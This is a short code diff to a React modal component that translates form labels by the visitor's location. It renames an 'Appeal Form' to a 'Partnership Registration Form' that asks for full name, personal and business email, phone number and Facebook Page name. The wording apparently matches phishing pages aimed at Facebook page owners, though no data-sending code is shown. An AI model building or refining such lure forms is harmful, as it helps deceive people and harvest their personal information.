@@ -51,7 +51,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Appeal Form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = ['Partnership Registration Form', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
